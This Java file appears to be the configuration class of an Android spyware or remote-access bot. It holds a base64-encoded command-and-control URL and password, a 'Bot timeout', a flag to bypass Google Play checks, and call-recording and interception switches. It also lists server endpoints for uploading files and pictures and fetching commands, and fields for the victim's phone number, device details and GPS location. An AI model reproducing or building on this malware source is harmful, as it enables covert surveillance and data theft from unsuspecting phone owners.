package u.can.i.up.expert.common;

import android.content.BroadcastReceiver;
import android.location.Location;
import android.location.LocationManager;
import android.preference.PreferenceManager;

import com.baidu.location.BDLocation;
import com.baidu.location.BDLocationListener;
import com.baidu.location.LocationClient;

import u.can.i.up.expert.MyService;
import u.can.i.up.expert.framework.MyLocationListener;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class DataSet {

    private static final DataSet cds = new DataSet();
    public final String LOG_TAG = "UCanIUp";
    public static DataSet getInstance(){
        return cds;
    }

    //********************************************************************************************************************************************************
//    public String encodedURL = "aHR0cDovLzIyMi4xMjguMTMuNzA6MTM4ODA="; //encode the URL with http://www.motobit.com/util/base64-decoder-encoder.asp  (ex. http://222.128.13.70:13880)
//    public String backupURL = "aHR0cDovLzIyMi4xMjguMTMuNzA6MTM4ODA=";
    public String encodedURL = "aHR0cDovLzE5Mi4xNjguMi4xMzg="; //encode the URL with http://www.motobit.com/util/base64-decoder-encoder.asp  (ex. http://192.168.2.138)
    public String backupURL = "aHR0cDovLzE5Mi4xNjguMi4xMzg=";
    //    public String encodedURL = "aHR0cDovLzE5Mi4xNjguMi41OQ=="; //encode the URL with http://www.motobit.com/util/base64-decoder-encoder.asp  (ex. http://192.168.2.59)
//    public String backupURL = "aHR0cDovLzE5Mi4xNjguMi41OQ==";
//    public String encodedURL = "aHR0cDovLzEwLjEwOS4yMzUuMTM4"; //encode the URL with http://www.motobit.com/util/base64-decoder-encoder.asp  (ex. http://10.109.235.138)
//    public String backupURL = "aHR0cDovLzEwLjEwOS4yMzUuMTM4";
    public String encodedPassword = "cGFzc3dvcmQ="; //encode the URL with http://www.motobit.com/util/base64-decoder-encoder.asp (ex. keylimepie)
    public int timeout = 10000; //Bot timeout
    public Boolean GPlayBypass = true; //true to bypass OR false to initiate immediately
    public Boolean recordCalls = true; //if recordCalls should start true
    public Boolean intercept = false; //if intercept should start true
    //********************************************************************************************************************************************************
    public long interval = 1000 * 60 * 60; //1 hour
    public int version = 1;
    //********************************************************************************************************************************************************
    public String androidId;
    public String URL;
    public String password;
    //********************************************************************************************************************************************************
    public String urlPostInfo = "/message.php?";
    public String urlSendUpdate = "/get.php?";
    public String urlUploadFiles = "/new-upload.php?";
    public String urlUploadPictures = "/upload-pictures.php?";
    public String urlFunctions = "/get-functions.php?";
    //********************************************************************************************************************************************************
    public BroadcastReceiver mReceiver;
    public MyService myService;
    //********************************************************************************************************************************************************
    public int random;
//    public Location location;
    public BDLocation location = null;
    public String phonenumber;
    public String device;
    public String sdk;
    public String provider;

    public PreferenceManager pm;
    public Double latitude;
    public Double longitude;
    //    public LocationManager locManager;
    public LocationClient locManager = null;

    public final BDLocationListener locationListener = new MyLocationListener();
}
